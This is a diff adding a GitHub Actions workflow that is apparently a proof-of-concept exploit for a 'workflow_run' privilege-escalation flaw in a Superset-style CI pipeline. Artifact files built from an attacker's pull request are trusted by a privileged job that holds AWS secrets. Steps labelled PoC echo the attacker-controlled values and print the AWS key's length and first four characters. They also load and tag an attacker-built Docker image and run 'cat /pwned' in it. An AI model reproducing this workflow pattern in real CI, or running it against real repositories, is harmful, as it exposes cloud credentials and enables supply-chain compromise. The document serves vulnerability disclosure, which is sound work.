@@ -1,0 +1,113 @@
+name: Push ephemeral env image
+
+on:
+  workflow_run:
+    workflows: ["Docker"]
+    types:
+      - completed
+
+jobs:
+  config:
+    runs-on: "ubuntu-latest"
+    if: github.event.workflow_run.event == 'pull_request' && github.event.workflow_run.conclusion == 'success'
+    outputs:
+      has-secrets: ${{ steps.check.outputs.has-secrets }}
+    steps:
+      - name: "Check for secrets"
+        id: check
+        shell: bash
+        run: |
+          if [ -n "${{ (secrets.AWS_ACCESS_KEY_ID != '' &&
+            secrets.AWS_ACCESS_KEY_ID != '' &&
+            secrets.AWS_SECRET_ACCESS_KEY != '' &&
+            secrets.AWS_SECRET_ACCESS_KEY != '') || '' }}" ]; then
+            echo "has-secrets=1" >> "$GITHUB_OUTPUT"
+            echo "has secrets!"
+          else
+            echo "has-secrets=0" >> "$GITHUB_OUTPUT"
+            echo "no secrets!"
+          fi
+
+  docker_ephemeral_env:
+    needs: config
+    if: needs.config.outputs.has-secrets
+    name: Push ephemeral env Docker image to ECR
+    runs-on: ubuntu-latest
+
+    steps:
+      - name: "Download artifact"
+        uses: actions/github-script@v3.1.0
+        with:
+          script: |
+            const artifacts = await github.actions.listWorkflowRunArtifacts({
+                owner: context.repo.owner,
+                repo: context.repo.repo,
+                run_id: ${{ github.event.workflow_run.id }},
+            });
+
+            core.info('*** artifacts')
+            core.info(JSON.stringify(artifacts))
+
+            const matchArtifact = artifacts.data.artifacts.filter((artifact) => {
+              return artifact.name == "build"
+            })[0];
+            if(!matchArtifact) return core.setFailed("Build artifacts not found")
+
+            const download = await github.actions.downloadArtifact({
+                owner: context.repo.owner,
+                repo: context.repo.repo,
+                artifact_id: matchArtifact.id,
+                archive_format: 'zip',
+            });
+            var fs = require('fs');
+            fs.writeFileSync('${{github.workspace}}/build.zip', Buffer.from(download.data));
+
+      - run: unzip build.zip
+
+      - name: Display downloaded files (debug)
+        run: ls -la
+
+      - name: Get SHA
+        id: get-sha
+        run: echo "::set-output name=sha::$(cat ./SHA)"
+
+      - name: Get PR
+        id: get-pr
+        run: echo "::set-output name=num::$(cat ./PR-NUM)"
+
+      - name: "PoC: show attacker-controlled values reached the privileged job"
+        run: |
+          echo "workflow_run.event=${{ github.event.workflow_run.event }}"
+          echo "workflow_run.conclusion=${{ github.event.workflow_run.conclusion }}"
+          echo "workflow_run.head_branch=${{ github.event.workflow_run.head_branch }}"
+          echo "workflow_run.head_repository=${{ github.event.workflow_run.head_repository.full_name }}"
+          echo "artifact SHA=[${{ steps.get-sha.outputs.sha }}]"
+          echo "artifact PR-NUM=[${{ steps.get-pr.outputs.num }}]"
+
+      - name: "PoC: privileged job has the AWS secret (redacted)"
+        env:
+          AWS_ACCESS_KEY_ID: ${{ secrets.AWS_ACCESS_KEY_ID }}
+        run: |
+          if [ -n "$AWS_ACCESS_KEY_ID" ]; then
+            echo "AWS_ACCESS_KEY_ID present in privileged job (len=${#AWS_ACCESS_KEY_ID}, prefix=${AWS_ACCESS_KEY_ID:0:4})"
+          else
+            echo "AWS_ACCESS_KEY_ID MISSING"
+          fi
+
+      - name: Load, tag and push image to ECR
+        id: push-image
+        env:
+          ECR_REGISTRY: registry.example.invalid
+          ECR_REPOSITORY: superset-ci
+          SHA: ${{ steps.get-sha.outputs.sha }}
+          IMAGE_TAG: pr-${{ steps.get-pr.outputs.num }}
+        run: |
+          echo "would push: $ECR_REGISTRY/$ECR_REPOSITORY:$IMAGE_TAG and $ECR_REGISTRY/$ECR_REPOSITORY:$SHA"
+          docker load < $SHA.tar.gz
+          docker tag $SHA $ECR_REGISTRY/$ECR_REPOSITORY:$IMAGE_TAG
+          docker images
+
+      - name: "PoC-only: verify the loaded image is attacker-built (no such step exists in the target)"
+        env:
+          SHA: ${{ steps.get-sha.outputs.sha }}
+        run: docker run --rm $SHA cat /pwned
